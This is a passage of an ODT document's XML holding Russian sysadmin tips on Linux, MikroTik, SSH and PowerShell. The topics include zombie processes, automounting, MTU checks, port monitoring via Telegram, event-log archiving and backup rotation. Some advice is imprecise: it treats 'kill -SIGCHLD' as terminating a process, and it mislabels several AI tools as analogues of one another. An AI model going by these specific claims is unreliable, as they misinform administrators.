      <text:p text:style-name="P26">2.1) Завершение родительского процесса. Если зомби-процесс еще существует, это значит, что его родитель не вызвал wait(). Определите родительский процесс (PPID): ps -eo pid,ppid,stat,cmd | grep 'Z'. Завершите его командой: kill -SIGCHLD &lt;PPID&gt;. Если процесс не реагирует, попробуйте: kill -9 &lt;PPID&gt;. Важно! Убедитесь, что родительский процесс не является критичным для системы.</text:p>
      <text:p text:style-name="P26">2.2) Перезапуск родительского процесса. Если завершение родителя недопустимо, попробуйте его перезапустить: systemctl restart &lt;service_name&gt; или service &lt;service_name&gt; restart</text:p>
      <text:p text:style-name="P27">2.3) Использование init/systemd для "усыновления" процесса. Если родительский процесс невозможно завершить или перезапустить, можно заставить init (PID 1) принять осиротевшие зомби. Это можно сделать, перезапустив родительский процесс, а затем проверив: ps -eo pid,ppid,stat,cmd | grep 'Z'</text:p>
      <text:p text:style-name="P27">2.4) Перезагрузка системы (как крайний случай): Если зомби-процессы не исчезают, а их количество растет, можно перезагрузить сервер: reboot или для безопасного завершения всех процессов: shutdown -r now</text:p>
      <text:p text:style-name="P26">3) Предотвращение появления зомби-процессов:</text:p>
      <text:p text:style-name="P26">1. Используйте обработку дочерних процессов в своих скриптах. Если пишете демоны или фоновые процессы, убедитесь, что ваш код корректно вызывает waitpid().</text:p>
      <text:p text:style-name="P26">2. Применяйте обработчики сигналов. В C/C++ можно использовать обработчик SIGCHLD:</text:p>
      <text:p text:style-name="P26">signal(SIGCHLD, SIG_IGN);</text:p>
      <text:p text:style-name="P26">3. Настройте systemd для автоматического управления процессами. В systemd можно создать службу с KillMode=process в /etc/systemd/system/myservice.service:</text:p>
      <text:p text:style-name="P26">[Service]</text:p>
      <text:p text:style-name="P26">KillMode=process</text:p>
      <text:p text:style-name="P28">4. Контролируйте процессы с помощью ulimit. Установите лимиты на максимальное число процессов: ulimit -u 100000</text:p>
      <text:p text:style-name="P26">Автоматическое монтирование дисков в Linux:</text:p>
      <text:p text:style-name="P26">1. Определение дисков и разделов. Перед монтированием нужно узнать, какие диски доступны:</text:p>
      <text:p text:style-name="P26">lsblk <text:s text:c="3"/># Показывает структуру дисков и разделов</text:p>
      <text:p text:style-name="P26">fdisk -l # Выводит информацию о разметке дисков</text:p>
      <text:p text:style-name="P26">blkid <text:s text:c="3"/># Показывает UUID и метки файловых систем</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">2. Монтирование вручную (для проверки): sudo mount /dev/sdXn /mnt. где /dev/sdXn – ваш раздел, /mnt – точка монтирования. Проверить можно командой df -h. Отключение монтирования: sudo umount /mnt</text:span></text:p>
      <text:p text:style-name="P26">3. Автоматическое монтирование через /etc/fstab. Для автоматического монтирования при загрузке добавьте строку в /etc/fstab: UUID=xxxx-xxxx /mnt ext4 defaults 0 2. Как узнать UUID? <text:s text:c="2"/>blkid | grep /dev/sdXn. Формат записи в fstab: &lt;устройство&gt; &lt;точка монтирования&gt; &lt;ФС&gt; &lt;опции&gt; &lt;dump&gt; &lt;pass&gt;. Пример для NTFS (Windows-диски): UUID=xxxx-xxxx /mnt/ntfs ntfs-3g defaults,uid=1000,gid=1000,dmask=027,fmask=137 0 0. Применение без перезагрузки: sudo mount -a</text:p>
      <text:p text:style-name="P26">4. Автомонтирование через systemd (для USB и съемных дисков). Создаем unit-файл: sudo nano /etc/systemd/system/mnt-usb.mount</text:p>
      <text:p text:style-name="P26">Вставляем:</text:p>
      <text:p text:style-name="P26">[Unit]</text:p>
      <text:p text:style-name="P26">Description=Монтирование USB</text:p>
      <text:p text:style-name="P26">Requires=systemd-fsck@dev-sdb1.service</text:p>
      <text:p text:style-name="P26">After=systemd-fsck@dev-sdb1.service</text:p>
      <text:p text:style-name="P26">[Mount]</text:p>
      <text:p text:style-name="P26">What=/dev/sdb1</text:p>
      <text:p text:style-name="P26">Where=/mnt/usb</text:p>
      <text:p text:style-name="P26">Type=vfat</text:p>
      <text:p text:style-name="P26">Options=defaults,noatime</text:p>
      <text:p text:style-name="P26">[Install]</text:p>
      <text:p text:style-name="P27">WantedBy=multi-user.target</text:p>
      <text:p text:style-name="P27">Активируем: sudo systemctl daemon-reload</text:p>
      <text:p text:style-name="P26">sudo systemctl enable mnt-usb.mount</text:p>
      <text:p text:style-name="P26">sudo systemctl start mnt-usb.mount</text:p>
      <text:p text:style-name="P26">5. Автомонтирование через udev (динамическое монтирование). Создаем правило: sudo nano /etc/udev/rules.d/99-usb-mount.rules. Добавляем:</text:p>
      <text:p text:style-name="P26">ACTION=="add", KERNEL=="sd[b-z][1-9]", RUN+="/bin/mount /dev/%k /mnt/usb"</text:p>
      <text:p text:style-name="P26">ACTION=="remove", KERNEL=="sd[b-z][1-9]", RUN+="/bin/umount /mnt/usb"</text:p>
      <text:p text:style-name="P26">Применяем изменения:</text:p>
      <text:p text:style-name="P26">sudo udevadm control --reload-rules</text:p>
      <text:p text:style-name="P28">sudo udevadm trigger</text:p>
      <text:p text:style-name="P26">Проверка SSL-сертификатов с помощью Bash. Иногда нужно быстро проверить срок действия SSL-сертификата удалённого сайта. Вот удобный однострочник на Bash, который покажет дату окончания действия сертификата:</text:p>
      <text:p text:style-name="P26">echo | openssl s_client -servername example.com -connect example.com:443 2&gt;/dev/null \</text:p>
      <text:p text:style-name="P26">| openssl x509 -noout -dates | grep notAfter</text:p>
      <text:p text:style-name="P26">Чтобы получить только оставшиеся дни до окончания:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">end_date=$(echo | openssl s_client -servername example.com -connect example.com:443 2&gt;/dev/null \</text:span></text:p>
      <text:p text:style-name="P26">| openssl x509 -noout -enddate | cut -d= -f2)</text:p>
      <text:p text:style-name="P26">end_ts=$(date -d "$end_date" +%s)</text:p>
      <text:p text:style-name="P26">now_ts=$(date +%s)</text:p>
      <text:p text:style-name="P28">echo "Осталось дней: $(( (end_ts - now_ts) / 86400 ))"</text:p>
      <text:p text:style-name="P26">Как быстро проверить MTU по пути до хоста и избежать фрагментации. Проблемы с VPN, нестабильной связью или подвисанием SSH? Часто причина - неправильная MTU на пути. Вот как проверить и подобрать оптимальное значение без фрагментации. Шаги для диагностики:</text:p>
      <text:p text:style-name="P26">1. Пингуй с флагом Don't Fragment и уменьшающейся длиной пакета: ping -M do -s 1472 8.8.8.8</text:p>
      <text:p text:style-name="P26">2. Если получаешь Frag needed, уменьши размер: ping -M do -s 1464 8.8.8.8</text:p>
      <text:p text:style-name="P26">3. Найди максимальный размер без фрагментации. MTU = размер + 28 (заголовки IP + ICMP). Например, если -s 1464 работает, MTU = 1464 + 28 = 1492.</text:p>
      <text:p text:style-name="P26">4. Проверь результат через трассировку с DF-флагом: tracepath 8.8.8.8</text:p>
      <text:p text:style-name="P28">Когда пригодится? При настройке WireGuard/OpenVPN, особенно поверх PPPoE или в облаке; При нестабильной TCP-сессии с непредсказуемыми сбоями; Когда сайт грузится частично, а ping работает - классика MTU-багов. Некоторые роутеры режут ICMP, так что тестируй через доступный хост.</text:p>
      <text:p text:style-name="P26">RegExp: Как найти строки с IP-адресами в логах. Частая задача - выцепить IP-адреса из логов. Вот регулярка и однострочник, которые помогут:grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' /var/log/nginx/access.log</text:p>
      <text:p text:style-name="P26">Что делает: Eo - включаем расширенные регулярки и выводим только совпадения; ([0-9]{1,3}\.){3}[0-9]{1,3} - шаблон для IPv4-адресов.</text:p>
      <text:p text:style-name="P27">Можно дополнительно убрать дубликаты и отсортировать по частоте: grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head</text:p>
      <text:p text:style-name="P25">Покажет топ IP-адресов по количеству обращений - удобно для анализа трафика и выявления подозрительной активности.</text:p>
      <text:p text:style-name="P26">Пять бесплатных альтернатив популярным нейросетям - делают ту же работу, но без подписок:</text:p>
      <text:p text:style-name="P26">Grok (grok.com) – альтернатива ChatGPT: быстро пишет тексты, отлично запоминает контекст и работает молниеносно;</text:p>
      <text:p text:style-name="P26">Ideogram (ideogram.ai) – замена KlingAI: за считанные секунды создаёт изображения, логотипы и иллюстрации высокого качества;</text:p>
      <text:p text:style-name="P26">HailuoAI (hailuoai.video) – аналог MidJourney: мощнейший китайский генератор сверхреалистичных картинок по текстовому описанию;</text:p>
      <text:p text:style-name="P26">Fotor (fotor.com/ai-image-generator) – альтернатива Photoshop: удобный AI-редактор для обработки фото и создания картинок через промпты;</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T5">Qwen (chat.qwen.ai) – заменяет Claude: нейросеть от Alibaba, которая мастерски пишет тексты и отвечает даже на самые сложные вопросы.</text:span></text:p>
      <text:p text:style-name="P26">В Debian (и производных, включая Ubuntu) для ускорения установки пакетов можно использовать утилиту libeatmydata, которая значительно снижает время установки за счёт отключения fsync и других дорогостоящих операций записи на диск. Что такое libeatmydata: libeatmydata - это LD_PRELOAD-библиотека, которая подменяет функции fsync(), fdatasync(), msync() и другие, превращая их в no-op (то есть они ничего не делают). Это полезно, когда производительность важнее надёжности - например, в CI, сборках образов, chroot'ах или при частой установке/удалении пакетов. Как использовать libeatmydata:</text:p>
      <text:p text:style-name="P26">1. Установите пакет: sudo apt install eatmydata</text:p>
      <text:p text:style-name="P26">2. Используйте eatmydata как префикс: sudo eatmydata apt install some-package</text:p>
      <text:p text:style-name="P26">3. Используйте с другими командами:</text:p>
      <text:p text:style-name="P26">sudo eatmydata dpkg -i some-package.deb</text:p>
      <text:p text:style-name="P26">sudo eatmydata apt upgrade -y</text:p>
      <text:p text:style-name="P26">Пример ускорения установки:</text:p>
      <text:p text:style-name="P26">time sudo apt install -y build-essential <text:s/># обычный способ</text:p>
      <text:p text:style-name="P26">time sudo eatmydata apt install -y build-essential <text:s/># ускоренный способ</text:p>
      <text:p text:style-name="P26">Важно: когда не стоит использовать: В продуктивной системе;</text:p>
      <text:p text:style-name="P26">Когда стабильность данных критична (напр. при установке базы данных);</text:p>
      <text:p text:style-name="P26">Если установка прерывается - есть риск повреждения пакетов.</text:p>
      <text:p text:style-name="P26">Расширенное применение. Внутри chroot / контейнеров: chroot /mnt/debian-root eatmydata apt install -y ...</text:p>
      <text:p text:style-name="P26">В скриптах сборки:</text:p>
      <text:p text:style-name="P26">#!/bin/bash</text:p>
      <text:p text:style-name="P26">export LD_PRELOAD=libeatmydata.so</text:p>
      <text:p text:style-name="P26">apt install -y ...</text:p>
      <text:p text:style-name="P28">Использование через debootstrap: sudo eatmydata debootstrap bullseye /mnt/debian http://deb.debian.org/debian</text:p>
      <text:p text:style-name="P26">Bash-совет дня: Мониторинг открытых портов с выводом в Telegram. Автоматизируй контроль за безопасностью своего сервера! Этот простой bash-скрипт проверяет изменения в открытых портах и шлёт уведомление в Telegram, если появились новые или исчезли старые порты.</text:p>
      <text:p text:style-name="P26">#!/bin/bash</text:p>
      <text:p text:style-name="P26"># Настройки</text:p>
      <text:p text:style-name="P26">TG_TOKEN="your_bot_token"</text:p>
      <text:p text:style-name="P26">TG_CHAT_ID="your_chat_id"</text:p>
      <text:p text:style-name="P26">PORTS_FILE="/var/tmp/open_ports_last.txt"</text:p>
      <text:p text:style-name="P26"># Получаем текущие открытые порты</text:p>
      <text:p text:style-name="P26">ss -tuln | awk 'NR&gt;1 {print $5}' | cut -d: -f2 | sort -n | uniq &gt; /tmp/open_ports_now.txt</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5"># Если нет предыдущего файла - создаём</text:span></text:p>
      <text:p text:style-name="P26">if [ ! -f "$PORTS_FILE" ]; then</text:p>
      <text:p text:style-name="P26">cp /tmp/open_ports_now.txt "$PORTS_FILE"</text:p>
      <text:p text:style-name="P26">exit 0</text:p>
      <text:p text:style-name="P26">fi</text:p>
      <text:p text:style-name="P26"># Сравниваем с предыдущим состоянием</text:p>
      <text:p text:style-name="P26">DIFF=$(diff -u "$PORTS_FILE" /tmp/open_ports_now.txt)</text:p>
      <text:p text:style-name="P26"># Если есть изменения - шлём в Telegram</text:p>
      <text:p text:style-name="P26">if [ -n "$DIFF" ]; then</text:p>
      <text:p text:style-name="P26">MESSAGE="⚠️ Обнаружены изменения в открытых портах:\n\`\`\`\n$DIFF\n\`\`\`"</text:p>
      <text:p text:style-name="P26">curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" \</text:p>
      <text:p text:style-name="P26">-d chat_id="$TG_CHAT_ID" \</text:p>
      <text:p text:style-name="P26">-d parse_mode="Markdown" \</text:p>
      <text:p text:style-name="P26">-d text="$MESSAGE"</text:p>
      <text:p text:style-name="P26">cp /tmp/open_ports_now.txt "$PORTS_FILE"</text:p>
      <text:p text:style-name="P26">fi</text:p>
      <text:p text:style-name="P26"># Уборка</text:p>
      <text:p text:style-name="P26">rm -f /tmp/open_ports_now.txt</text:p>
      <text:p text:style-name="P26">Как использовать:</text:p>
      <text:p text:style-name="P26">1. Замените your_bot_token и your_chat_id на свои значения.</text:p>
      <text:p text:style-name="P28">2. Добавьте в cron, чтобы проверять, например, каждые 10 минут: */10 * * * * /path/to/script.sh</text:p>
      <text:p text:style-name="P26">Подборка часто используемых команд для первоначальной настройки устройств MikroTik: имя устройства, DNS сервера, Email, время, доступы и т.д. Установки имени устройства: /system identity set name=MyHomeMikrotik</text:p>
      <text:p text:style-name="P26">Установка своих DNS серверов и отключение получения их по DHCP:</text:p>
      <text:p text:style-name="P26">/ip dns set servers=8.8.8.8,1.1.1.1</text:p>
      <text:p text:style-name="P26">/ip dhcp-client set [find ] use-peer-dns=no</text:p>
      <text:p text:style-name="P26">Настройка email клиента для работы с Yandex.Mail. Для корректной работы разрешите в настройках профиля авторизацию SMTP по обычному паролю или [рекомендуется] используйте пароли приложений (почта)</text:p>
      <text:p text:style-name="P26">/tool e-mail</text:p>
      <text:p text:style-name="P26">set address=smtp.yandex.ru from=example@yandex.ru password=example-pass port=587 start-tls=yes user=example@yandex.ru</text:p>
      <text:p text:style-name="P27">Настройка синхронизации времени по NTP и MikroTik Cloud Time (Москва):</text:p>
      <text:p text:style-name="P27">/system ntp client set enabled=yes server-dns-names=time.google.com,0.pool.ntp.org,1.pool.ntp.org,2.pool.ntp.org,3.pool.ntp.org</text:p>
      <text:p text:style-name="P26">/system clock set time-zone-autodetect=no</text:p>
      <text:p text:style-name="P26">/system clock set time-zone-name=Europe/Moscow</text:p>
      <text:p text:style-name="P26">/ip cloud set update-time=yes </text:p>
      <text:p text:style-name="P26">Изменение количества строк системного лога: /system logging action set memory memory-lines=10000</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Очистка системного лога (оставляет сообщение о смене настроек лога):</text:span></text:p>
      <text:p text:style-name="P26">/system logging action set memory memory-lines=1</text:p>
      <text:p text:style-name="P26">/system logging action set memory memory-lines=10000</text:p>
      <text:p text:style-name="P26">Контроль доступа с IP адресов домена. Это позволяет использовать DynamicDNS для записей своего домена, и получать доступ к устройству с IP адресов, которые будут резолвится с домена. RouterOS будет сам обновлять записи и access-list при изменении записи в домене. Обратите внимание, в конце 2 строки с move. Это сделано для того, чтобы правило корректно двигалось на первое место при включенном fasttrack (то есть первое место), а также при отключенном (на нулевое место):</text:p>
      <text:p text:style-name="P26">/ip firewall address-list</text:p>
      <text:p text:style-name="P26">add address=access.example.con list=DomainIPsAccess</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add action=accept chain=input src-address-list=DomainIPsAccess comment="Allow DomainIPsAccess"</text:p>
      <text:p text:style-name="P26">move [find comment="Allow DomainIPsAccess"] 1</text:p>
      <text:p text:style-name="P26">move [find comment="Allow DomainIPsAccess"] 0</text:p>
      <text:p text:style-name="P26">Отключение ненужных служб доступа (web тоже отключается, осторожно):</text:p>
      <text:p text:style-name="P26">/ip service disable www,ftp,api,api-ssl,telnet</text:p>
      <text:p text:style-name="P26">/ip service enable ssh,winbox</text:p>
      <text:p text:style-name="P26">/ip service set ssh address=""</text:p>
      <text:p text:style-name="P26">/ip service set winbox address=""</text:p>
      <text:p text:style-name="P26">Фикс MTU (нужен редко, но метко): /ip firewall mangle</text:p>
      <text:p text:style-name="P26">add chain=postrouting out-interface-list=WAN protocol=tcp tcp-flags=syn,!ack action=change-mss new-mss=clamp-to-pmtu comment="MTU Fix" passthrough=yes</text:p>
      <text:p text:style-name="P26">Заблокировать доступ к WiFi по MAC-адресу: /interface wireless access-list authentication=no mac-address=8A:EA:B7:2E:38:C1 </text:p>
      <text:p text:style-name="P26">Поместить клиента WiFi в отдельный VLAN по MAC-адресу: /interface wireless access-list</text:p>
      <text:p text:style-name="P26">add interface=all mac-address=8A:EA:B7:2E:38:C1 vlan-id=99 vlan-mode=use-tag</text:p>
      <text:p text:style-name="P26">Настройка пароля и безопасности WiFi на default профиль: /interface wireless security-profiles set default mode=dynamic</text:p>
      <text:p text:style-name="P26">-keys authentication-types=wpa2-psk unicast-ciphers=aes-ccm group-ciphers=aes-ccm</text:p>
      <text:p text:style-name="P26">wpa2-pre-shared-key=bigpassword</text:p>
      <text:p text:style-name="P28">Включение пробросов портов SSH: /ip ssh set forwarding-enabled=both</text:p>
      <text:p text:style-name="P26">Изменение порта для подключения по SSH:</text:p>
      <text:p text:style-name="P26">Чтобы изменить порт для подключения по SSH необходимо отредактировать файл конфигурации SSH демона. Откроем данный файл текстовым редактором: vim /etc/ssh/sshd_config. Найдем строку Port 22 и изменим её, указав новый порт для</text:p>
      <text:p text:style-name="P29">подключения. Например Port 25022. Выходим, сохраняем файл и перезагружаем SSH следующей командой: service sshd restart</text:p>
      <text:p text:style-name="P26">После перезапуска SSH, он станет доступен по новому порту, а текущая сессия на старом останется активной. Поэтому не отключаясь для проверки попробуем подключится по новому порту - если не пускает, то возможно в системе работает фаервол и нужно в нем разрешить новый порт, например в iptables это делается так (где 25022 наш новый порт): iptables -A INPUT -p tcp --dport 25022 -j ACCEPT</text:p>
      <text:p text:style-name="P26">Можно разрешить средствами iptables подключение к SSH только с указанного диапазона IP адресов: iptables -A INPUT -d 192.168.0.0/24 -p tcp --dport 25022 -j ACCEPT</text:p>
      <text:p text:style-name="P26">где 192.168.0.0/24 - IP адрес сети и маска сети, с которых разрешено подключение по SSH. Далее проверяем подключение по SSH на новом порту ssh &lt;user&gt;@&lt;ip&gt; -p &lt;port&gt; - если подключение выполняется, то можем удалить правило iptables подключения по SSH по старому порту: iptables -D INPUT -p tcp --dport 22 -j ACCEPT</text:p>
      <text:p text:style-name="P28">Посмотреть в системе на каком порту и на каких сетевых интерфейсах работает SSH можно следующей командой: netstat -tulpan | grep ssh</text:p>
      <text:p text:style-name="P26">Как перезапускать сервис только если он завис? Иногда не хочется перезапускать сервис "на всякий случай", но вот если он реально завис - другое дело. Вот простой способ проверять, активен ли сервис, и перезапускать его при зависании:</text:p>
      <text:p text:style-name="P26">#!/bin/bash</text:p>
      <text:p text:style-name="P26">SERVICE="nginx"</text:p>
      <text:p text:style-name="P26">if ! systemctl is-active --quiet "$SERVICE"; then</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>echo "$(date): $SERVICE не активен, пробую перезапустить..." &gt;&gt; /var/log/service_monitor.log</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>systemctl restart "$SERVICE"</text:p>
      <text:p text:style-name="P26">else</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>echo "$(date): $SERVICE работает нормально" &gt;&gt; /var/log/service_monitor.log</text:p>
      <text:p text:style-name="P26">fi</text:p>
      <text:p text:style-name="P26">Можно добавить в крон, например, проверку каждые 5 минут: */5 * * * * /usr/local/bin/check_nginx.sh</text:p>
      <text:p text:style-name="P26">Не забудь сделать скрипт исполняемым: chmod +x /usr/local/bin/check_nginx.sh</text:p>
      <text:p text:style-name="P28">Можно заменить nginx на любой другой системный сервис.</text:p>
      <text:p text:style-name="P26">Мониторим активные подключения к серверу по SSH. Иногда нужно быстро узнать, кто сейчас подключён к серверу по SSH. Вот простой однострочный скрипт: who | grep 'pts' | awk '{print $1, $2, $5}'</text:p>
      <text:p text:style-name="P26">Что делает этот скрипт?</text:p>
      <text:p text:style-name="P26">* who - выводит список всех вошедших пользователей.</text:p>
      <text:p text:style-name="P26">* grep 'pts' - фильтрует только те строки, что связаны с терминалами SSH.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">* awk '{print $1, $2, $5}' - красиво выводит имя пользователя, терминал и IP-адрес.</text:span></text:p>
      <text:p text:style-name="P26">Пример вывода:</text:p>
      <text:p text:style-name="P26">admin pts/0 (192.168.1.55)</text:p>
      <text:p text:style-name="P25">root <text:s/>pts/1 (10.0.0.23)</text:p>
      <text:p text:style-name="P27">Один из файловых серверов неожиданно перестал принимать события - логи просто «забились» до предела, из-за чего служба безопасности не могла записывать критичные события входа. Оказалось, что журналы событий выросли до 10 ГБ и система больше не записывала новые записи. Чтобы предотвратить подобные ситуации, я собрал небольшой скрипт для автоматического архивации и очистки журналов событий, когда их размер превышает заданный порог. Вот пример, который запустил на сервере:</text:p>
      <text:p text:style-name="P26"># Порог в мегабайтах</text:p>
      <text:p text:style-name="P26">$logSizeThresholdMB = 1024</text:p>
      <text:p text:style-name="P26"># Папка для архивации</text:p>
      <text:p text:style-name="P26">$archivePath = "D:\EventLogArchives"</text:p>
      <text:p text:style-name="P26">if (-not (Test-Path $archivePath)) {</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>New-Item -Path $archivePath -ItemType Directory | Out-Null</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26"># Функция для проверки и архивации логов</text:p>
      <text:p text:style-name="P26">function Archive-And-Clear-EventLog {</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>param (</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>[string]$LogName</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/># Определяем текущий размер лога</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>$logInfo = wevtutil gl $LogName</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>$fileSizeLine = ($logInfo | Where-Object { $_ -match "fileSize" })</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>$sizeBytes = [int64]($fileSizeLine -replace "[^0-9]", "")</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>$sizeMB = [math]::Round($sizeBytes / 1MB, 2)</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>if ($sizeMB -ge $logSizeThresholdMB) {</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>$timestamp = (Get-Date).ToString("yyyyMMdd_HHmmss")</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>$archiveFile = Join-Path $archivePath "$LogName`_$timestamp.evtx"</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/># Экспортируем текущий журнал</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>wevtutil epl $LogName $archiveFile</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>Write-Host "Архивировал лог $LogName (размер $sizeMB MB) в $archiveFile"</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/># Очищаем журнал</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>wevtutil cl $LogName</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>Write-Host "Очищен лог $LogName"</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>} else {</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>Write-Host "Лог $LogName в пределах нормы: $sizeMB MB"</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5"># Получаем все журналы, которые хотим контролировать (пример: System и Security)</text:span></text:p>
      <text:p text:style-name="P26">$logsToCheck = @("System", "Security")</text:p>
      <text:p text:style-name="P26">foreach ($log in $logsToCheck) {</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Archive-And-Clear-EventLog -LogName $log</text:p>
      <text:p text:style-name="P27">}</text:p>
      <text:p text:style-name="P25">Этот скрипт проверяет размер каждого указанного журнала, экспортирует его в папку архива, если размер больше 1 ГБ, и очищает файл. Я поставил его в Task Scheduler с частотой 1 раз в сутки, чтобы не «догонять» проблему вручную. А какие у вас есть практики по управлению журналами событий? Используете стандартные утилиты wevtutil/Get-WinEvent или доверяете решениям наподобие SCOM/Elastic Stack?</text:p>
      <text:p text:style-name="P26">Сегодня я хочу поделиться простым, но очень полезным Bash-скриптом для автоматического резервного копирования директорий с ротацией старых бэкапов. Такой скрипт пригодится, если необходимо сохранять копии важных данных и при этом не засорять диск старыми архивами. Скрипт: Backup с ротацией:</text:p>
      <text:p text:style-name="P26">#!/usr/bin/env bash</text:p>
      <text:p text:style-name="P26"># ================================</text:p>
      <text:p text:style-name="P26"># Скрипт: backup_rotate.sh</text:p>
      <text:p text:style-name="P26"># Автор: https://t.me/bash_srv</text:p>
      <text:p text:style-name="P26"># Описание: Создаёт архив указанной директории,</text:p>
      <text:p text:style-name="P26"># <text:s text:c="2"/>хранит только последние N бэкапов, удаляя старые.</text:p>
      <text:p text:style-name="P26"># ================================</text:p>
      <text:p text:style-name="P26"># Настройки</text:p>
      <text:p text:style-name="P26">SOURCE_DIR="/var/www/my_project" <text:s text:c="5"/># Директория, которую резервируем</text:p>
      <text:p text:style-name="P26">DEST_DIR="/backups/my_project" <text:s text:c="8"/># Директория для хранения бэкапов</text:p>
      <text:p text:style-name="P26">RETENTION_DAYS=7 <text:s text:c="22"/># Сколько дней хранить бэкапы</text:p>
      <text:p text:style-name="P26"># Текущее время для имени архива</text:p>
      <text:p text:style-name="P26">DATE=$(date +"%Y-%m-%d_%H-%M-%S")</text:p>
      <text:p text:style-name="P26">ARCHIVE_NAME="backup_${DATE}.tar.gz"</text:p>
      <text:p text:style-name="P26"># Проверяем, что исходная директория существует</text:p>
      <text:p text:style-name="P26">if [[ ! -d "$SOURCE_DIR" ]]; then</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>echo " Исходная директория $SOURCE_DIR не найдена!"</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>exit 1</text:p>
      <text:p text:style-name="P26">fi</text:p>
      <text:p text:style-name="P26"># Создаём директорию назначения, если её нет</text:p>
      <text:p text:style-name="P26">mkdir -p "$DEST_DIR"</text:p>
      <text:p text:style-name="P26"># Создаём архив</text:p>
      <text:p text:style-name="P26">tar -czf "${DEST_DIR}/${ARCHIVE_NAME}" -C "$(dirname "$SOURCE_DIR")" "$(basename "$SOURCE_DIR")"</text:p>
      <text:p text:style-name="P26">if [[ $? -eq 0 ]]; then</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5"><text:s text:c="2"/>echo "Создан бэкап: ${DEST_DIR}/${ARCHIVE_NAME}"</text:span></text:p>
      <text:p text:style-name="P26">else</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>echo " Ошибка при создании архива!"</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>exit 1</text:p>
      <text:p text:style-name="P26">fi</text:p>
      <text:p text:style-name="P26"># Удаляем старые бэкапы старше RETENTION_DAYS</text:p>
      <text:p text:style-name="P26">find "$DEST_DIR" -type f -name "backup_*.tar.gz" -mtime +${RETENTION_DAYS} -print -delete</text:p>
      <text:p text:style-name="P26">echo "Удалены бэкапы старше ${RETENTION_DAYS} дней."</text:p>
      <text:p text:style-name="P27">exit 0</text:p>
      <text:p text:style-name="P27">Пояснение к скрипту</text:p>
      <text:p text:style-name="P26">1. Настройки переменных:</text:p>
      <text:p text:style-name="P26">SOURCE_DIR - путь к директории, которую нужно сохранить (например, веб-проект, база данных и т.д.).</text:p>
      <text:p text:style-name="P26">DEST_DIR - куда складываем архива (может быть локальная папка или смонтированный удалённый диск).</text:p>
      <text:p text:style-name="P26">RETENTION_DAYS - сколько дней хранить бэкапы. Всё, что старше этого значения, будет удаляться автоматически.</text:p>
      <text:p text:style-name="P26">2. Скрипт проверяет, существует ли исходная директория. Если нет - выводит ошибку и завершает работу.</text:p>
      <text:p text:style-name="P26">3. Создаётся папка назначения (mkdir -p), чтобы избежать ошибок, если её ещё нет.</text:p>
      <text:p text:style-name="P26">4. Делается tar.gz - архив директории, причём для удобства используется команда: tar -czf ${DEST_DIR}/${ARCHIVE_NAME} -C $(dirname $SOURCE_DIR) $(basename $SOURCE_DIR) - Это позволяет не копировать весь путь в архив, а только нужную папку.</text:p>
      <text:p text:style-name="P26">5. Если архивирование прошло успешно (код возврата 0) - выводим сообщение об успехе.</text:p>
      <text:p text:style-name="P26">6. Далее команда find ищет файлы-архивы старше RETENTION_DAYS дней и удаляет их. Параметр -mtime +N означает “более N дней назад”. Опция -print -delete сначала покажет, что удаляется, а потом удалит.</text:p>
      <text:p text:style-name="P26">7. В конце скрипт выводит, сколько старых бэкапов удалено, и завершает работу.</text:p>
      <text:p text:style-name="P26">Как использовать:</text:p>
      <text:p text:style-name="P26">1. Скопируйте скрипт в файл, например: sudo nano /usr/local/bin/backup_rotate.sh</text:p>
      <text:p text:style-name="P26">2. Сделайте его исполняемым: sudo chmod +x /usr/local/bin/backup_rotate.sh</text:p>
      <text:p text:style-name="P26">3. Отредактируйте переменные в начале скрипта под свои нужды:</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>SOURCE_DIR="/path/to/your/data"</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>DEST_DIR="/path/to/backup/location"</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>RETENTION_DAYS=7</text:p>
